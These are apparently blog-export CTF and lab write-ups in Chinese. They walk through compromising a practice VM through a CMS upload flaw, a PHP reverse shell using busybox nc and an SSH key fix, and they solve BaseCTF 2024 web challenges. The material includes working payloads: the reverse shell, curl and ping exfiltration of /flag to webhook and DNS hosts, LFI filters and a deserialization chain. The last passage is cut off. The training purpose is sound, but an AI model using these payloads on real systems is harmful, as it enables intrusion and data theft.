<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>群友靶机之Lzh</title>
      <link href="/posts/41646.html"/>
      <url>/posts/41646.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取靶机地址：</span><br><span class="line">https://maze-sec.com/</span><br><span class="line">qq群：660930334</span><br></pre></td></tr></table></figure><h1 id="配置："><a href="#配置：" class="headerlink" title="配置："></a>配置：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">靶机用VirtualBox制作，VMware导入可能网卡不兼容</span><br><span class="line">用户:todd 密码:qq660930334</span><br><span class="line">1. 启动虚拟机时按`e`键进入GRUB编辑模式</span><br><span class="line">2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`</span><br><span class="line">3. 按Ctrl+X启动进入单用户模式</span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line">allow-hotplug ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line"></span><br><span class="line">ip link set ens33 up</span><br><span class="line">dhclient ens33</span><br><span class="line">reboot -f</span><br></pre></td></tr></table></figure><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p><img src="/../images/image-20251214153738204.png" alt="image-20251214153738204"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依旧是22,80端口</span><br></pre></td></tr></table></figure><h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p><img src="/../images/image-20251214153955731.png" alt="image-20251214153955731"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给了个cms的源码,应该是有部署了这一套的cms，尝试访问/mozilo/</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214155312392.png" alt="image-20251214155312392"></p><h1 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果是cms，那应该就是打的nday了【之前打的awd倒是很多这种】</span><br><span class="line">版本也给了，直接搜发现有个rce的洞</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214155724844.png" alt="image-20251214155724844"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看了利用方式那就是后台直接upload文件上传，然后</span><br><span class="line">在/kategorien/Willkommen/dateien/反弹shell就好了</span><br><span class="line">漏洞点是在后台的，对于常规cms的密码设置可能会出现在安装文件或者配置文件当中，可以尝试去翻阅一下</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214160825912.png" alt="image-20251214160825912"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">虽然没有直接找到默认的账号密码，但是找到了账号密码的设置条件【至少8位字符，有数字，有小写字母，有大写字母】，可以对于爆破的字典进行正则匹配一下，更精准一点</span><br><span class="line">^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]&#123;8,&#125;$</span><br><span class="line">admin/Admin123</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214162147409.png" alt="image-20251214162147409"></p><h1 id="nday获得webshell"><a href="#nday获得webshell" class="headerlink" title="nday获得webshell"></a>nday获得webshell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进来找到上传文件的地方,正常的文件上传流程尝试一下</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214162322443.png" alt="image-20251214162322443"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">exec(&quot;busybox nc 192.168.44.128 4444 -e bash&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接上传php文件显示Filetype not allowed，但是发现上传之后可以重命名文件，那么就先上传txt再修改成php就好了，然后来到反弹shell就好了</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214162654602.png" alt="image-20251214162654602"></p><p><img src="/../images/image-20251214162756225.png" alt="image-20251214162756225"></p><p><img src="/../images/image-20251214162916346.png" alt="image-20251214162916346"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">拿到webshell之后想要获得用户权限--去home下发现用户welcome，对于cms来说数据库和配置文件可能会存有账号密码，那就翻翻翻加grep好了</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214163349051.png" alt="image-20251214163349051"></p><p><img src="/../images/image-20251214163503120.png" alt="image-20251214163503120"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su welcome</span><br><span class="line">3e73d572ba005bb3c02107b2e2fc16f8</span><br></pre></td></tr></table></figure><h1 id="权限再提升"><a href="#权限再提升" class="headerlink" title="权限再提升"></a>权限再提升</h1><p><img src="/../images/image-20251214163726857.png" alt="image-20251214163726857"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现本地有一个id_rsa私钥文件，直接连上去显示格式错误</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214164102647.png" alt="image-20251214164102647"></p><p><img src="/../images/image-20251214164130494.png" alt="image-20251214164130494"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat一下文件发现前三位没有了导致格式错误，联想到图片之类的文件的文件头缺少会导致不可用，是不是id_rsa私钥文件也有相应的文件头</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----OpenSSH 格式 前三个字符是b3B版本标识符 &quot;openssh-key-v1&quot; 开头的编码结果 </span><br><span class="line">那就新建一个rsa文件【因为没有权限直接改id_rsa文件】把前三个字符改成rsa连接一下试试</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214170027876.png" alt="image-20251214170027876"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一开始直接给777权限会显示权限设置过于宽松，存在安全风险，因此SSH客户端拒绝使用，改成600就好了</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">常规的cms打nday获得webshell再</span><br><span class="line">配置文件存在默认账号密码获得用户权限再</span><br><span class="line">正确修改ssh私钥格式连接获得root权限</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 群友靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>做梦都想进vn之base2024ctf</title>
      <link href="/posts/26285.html"/>
      <url>/posts/26285.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">诶诶 打的minvn被自己菜哭了，感悟很深也是深深emo了，但是没有关系我一定会变成大魔王杀回来的【蹲个2月的vnctf】。</span><br><span class="line">说到着又得感谢sun了，他把我的ctf的路拉到正路上，才有后面的这些</span><br><span class="line">哎，会变好的，深感自己的不足，再沉淀沉淀。</span><br></pre></td></tr></table></figure><h1 id="base2024ctf"><a href="#base2024ctf" class="headerlink" title="base2024ctf"></a>base2024ctf</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://gz.imxbt.cn/</span><br><span class="line">https://luokuang1.github.io/2024/09/25/BaseCTF2024%E9%A2%98%E8%A7%A3/</span><br><span class="line">省流：官wp是pdf忘记链接在哪了，没最后0解和cve</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h3><h4 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h4><p>一句话木马的连接使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$a = $_GET[&#x27;DT&#x27;];</span><br><span class="line"></span><br><span class="line">eval($a);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.imxbt.cn:30114/?DT=system(%22cat%20/flag%22);</span><br></pre></td></tr></table></figure><h4 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;name2&#x27;]) &amp;&amp; isset($_POST[&#x27;password2&#x27;]) )&#123;</span><br><span class="line">    $name = $_GET[&#x27;name&#x27;];</span><br><span class="line">    $name2 = $_GET[&#x27;name2&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    $password2 = $_POST[&#x27;password2&#x27;];</span><br><span class="line">    if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;</span><br><span class="line">        if ($name2 !== $password2 &amp;&amp; md5($name2) === md5($password2))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;再看看啊，马上绕过嘞！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;错啦错啦&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &#x27;没看到参数呐&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; 没看到参数呐</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?name=QNKCDZO&amp;name2[]=1</span><br><span class="line"> password=240610708&amp;password2[]=2</span><br></pre></td></tr></table></figure><h4 id="HTTP是什么呀"><a href="#HTTP是什么呀" class="headerlink" title="HTTP是什么呀"></a>HTTP是什么呀</h4><p><img src="/../images/image-20251009191711573.png" alt="image-20251009191711573"></p><p>后面是进⾏了两次重定向，抓包获得flag然后base64解密就好了</p><h4 id="ADarkRoom"><a href="#ADarkRoom" class="headerlink" title="ADarkRoom"></a>ADarkRoom</h4><p><img src="/../images/image-20251009191927127.png" alt="image-20251009191927127"></p><h4 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">快来上传你最喜欢的照片吧~ 等下,这个 php 后缀的照片是什么?</span><br></pre></td></tr></table></figure><p>常规文件上传 木马连接找flag</p><p><img src="/../images/image-20251009192648476.png" alt="image-20251009192648476"></p><h4 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h4><p>php伪协议的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// Aura 酱，欢迎回家~</span><br><span class="line">// 这里有一份礼物，请你签收一下哟~</span><br><span class="line">$pen = $_POST[&#x27;pen&#x27;];</span><br><span class="line">if (file_get_contents($pen) !== &#x27;Aura&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><br><span class="line">$challenge = $_POST[&#x27;challenge&#x27;];</span><br><span class="line">if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0)</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;这不是 Aura 的博客！&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$blog_content = file_get_contents($challenge);</span><br><span class="line">if (strpos($blog_content, &#x27;已经收到Kengwang的礼物啦&#x27;) === false)</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;请去博客里面写下感想哦~&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><br><span class="line">$gift = $_POST[&#x27;gift&#x27;];</span><br><span class="line">include($gift); 这是 Aura 的礼物，你不是 Aura！</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,Aura</span><br><span class="line">http://jasmineaura.github.io@127.0.0.1</span><br><span class="line">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h4><p>php的反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__construct():具有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line">__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line">__toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj;应该显示些什么。 此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br><span class="line">__sleep()方法在一个对象被序列化之前调用；</span><br><span class="line">__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</span><br><span class="line">get(),set() 当调用或设置一个类及其父类方法中未定义的属性时</span><br><span class="line">__invoke() 调用函数的方式调用一个对象时的回应方法</span><br><span class="line">call 和 callStatic前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行。</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010145440893.png" alt="image-20251010145440893"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">⻅⼀个__wakeup魔术⽅法，并且将kw当做了⼀个字符串输出，所以就想到了⾛__tostirng⽅法,令kw为re的对象，再把chu0赋值，然后在这个⽅法最后⾯⽤chu0调⽤了nononono，那么可以看到整个源码中都没有这个属性，所以可以想到_get()魔术⽅法。可以看到有个_get()⽅法，那么最后⾯就⼀样了，调⽤over为misc对象即可。</span><br><span class="line"></span><br><span class="line"> web -&gt; re -&gt; pwn -&gt; Misc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class re&#123;</span><br><span class="line">    public $chu0;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(!isset($this-&gt;chu0))&#123;</span><br><span class="line">            return &quot;I can not believes!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;chu0-&gt;$nononono;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web &#123;</span><br><span class="line">    public $kw;</span><br><span class="line">    public $dt;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;lalalla&quot;.$this-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        echo &quot;ALL Done!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class pwn &#123;</span><br><span class="line">    public $dusk;</span><br><span class="line">    public $over;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        if($this-&gt;dusk != &quot;gods&quot;)&#123;</span><br><span class="line">            echo &quot;什么，你竟敢不认可?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;over-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Misc &#123;</span><br><span class="line">    public $nothing;</span><br><span class="line">    public $flag;</span><br><span class="line"></span><br><span class="line">    public function getflag() &#123;</span><br><span class="line">        eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new re();</span><br><span class="line">$b=new web();</span><br><span class="line">$c=new pwn();</span><br><span class="line">$d=new Misc();</span><br><span class="line"></span><br><span class="line">$b -&gt;kw=$a;</span><br><span class="line">$a -&gt;chu0=$c;</span><br><span class="line">$c -&gt;dusk=&quot;gods&quot;;</span><br><span class="line">$c -&gt;over=$d;</span><br><span class="line"></span><br><span class="line">echo serialize($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="⼀起吃⾖⾖"><a href="#⼀起吃⾖⾖" class="headerlink" title="⼀起吃⾖⾖"></a>⼀起吃⾖⾖</h4><p>禁了查看源代码，右键检查直接看，找到index.js，base64解码</p><p><img src="/../images/image-20251010151535184.png" alt="image-20251010151535184"></p><h4 id="你听不到我的声⾳"><a href="#你听不到我的声⾳" class="headerlink" title="你听不到我的声⾳"></a>你听不到我的声⾳</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">shell_exec($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure><p>shell_exec 不会将执⾏结果直接输出, 我们需要⽤其他⽅式进⾏外带</p><p>外带思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">• 重定向到⽂件</span><br><span class="line">我们可以⽤流重定向符号来将输出内容重定向到⽂件中, 在通过浏览器进⾏下载</span><br><span class="line">1 cmd_here &gt; 1.txt</span><br><span class="line">然后就可以通过访问 1.txt 获取到输出内容了</span><br><span class="line"></span><br><span class="line">• 通过 curl 外带</span><br><span class="line">我们可以通过 https://webhook.site/ 来进⾏数据外带, 我们可以拿到这样⼀个链接</span><br><span class="line">https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb</span><br><span class="line">此时这个路径下的所有请求都会被记录</span><br><span class="line">于是我们可以通过shell指令:</span><br><span class="line">curl https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb/`cat /flag |</span><br><span class="line">base64`</span><br><span class="line"></span><br><span class="line">• Dnslog 外带</span><br><span class="line">Dnslog 的话可以使⽤国内的 dnslog.cn 不稳定</span><br><span class="line">也可⽤在刚刚那⾥的 webhook 下⾯有个 dnshook</span><br><span class="line">此时我们可以⽤ ping 外带</span><br><span class="line">1 ping `cat /flag | base64`.xxxxxxx.dnshook.site</span><br><span class="line"></span><br><span class="line">• 直接写⻢</span><br><span class="line">或者我们可以利⽤指令写⻢, ⽤ wget, curl 下载⽊⻢</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010152557120.png" alt="image-20251010152557120"></p><h4 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">// check if space is present in the command</span><br><span class="line">// use of preg_match to check if space is present in the command</span><br><span class="line">if (preg_match(&#x27;/\s/&#x27;, $cmd)) &#123;</span><br><span class="line">    echo &#x27;Space not allowed in command&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// execute the command</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">空格过滤</span><br><span class="line">4.1 %20空格绕过</span><br><span class="line">是 URL 编码的空格</span><br><span class="line">?c=system(&quot;tac%20flag.php&quot;)</span><br><span class="line"></span><br><span class="line">4.2 %09空格绕过</span><br><span class="line">%09 是 URL 编码中的水平制表符（Tab，ASCII 码为 9），它的作用是将 tac 后面的 fla* 和前面的部分隔开，通常它不会影响命令的执行，只是空格的替代。</span><br><span class="line">?c=system(&quot;tac%09flag.php&quot;);</span><br><span class="line"></span><br><span class="line">4.3 $IFS$9空格绕过</span><br><span class="line">$IFS 是一个特殊的环境变量，表示 Internal Field Separator（内部字段分隔符），默认情况下，$IFS 的值包含空格、制表符和换行符。$9是命令行参数的占位符之一，会被解析为空字符串。两者结合可以起到空格的作用</span><br><span class="line">?c=system(&quot;tac$IFS$9flag.php&quot;);</span><br><span class="line"></span><br><span class="line">4.4 $&#123;IFS&#125;绕过</span><br><span class="line">?c=system(&quot;tac$&#123;IFS&#125;flag.php&quot;)</span><br><span class="line">4.5 &lt;空格绕过</span><br><span class="line">?c=system(&quot;tac&lt;fla*&quot;);</span><br><span class="line">&lt; 是 输入重定向符号，用于将文件内容作为命令的输入，可以用于空格绕过。</span><br></pre></td></tr></table></figure><p>cat$IFS$9&#x2F;flag</p><h4 id="所以你说你懂-MD5"><a href="#所以你说你懂-MD5" class="headerlink" title="所以你说你懂 MD5?"></a>所以你说你懂 MD5?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// 所以你说你懂 MD5 了?</span><br><span class="line"></span><br><span class="line">$apple = $_POST[&#x27;apple&#x27;];</span><br><span class="line">$banana = $_POST[&#x27;banana&#x27;];</span><br><span class="line">if (!($apple !== $banana &amp;&amp; md5($apple) === md5($banana))) &#123;</span><br><span class="line">    die(&#x27;加强难度就不会了?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 什么? 你绕过去了?</span><br><span class="line">// 加大剂量!</span><br><span class="line">// 我要让他成为 string</span><br><span class="line">$apple = (string)$_POST[&#x27;appple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;bananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana 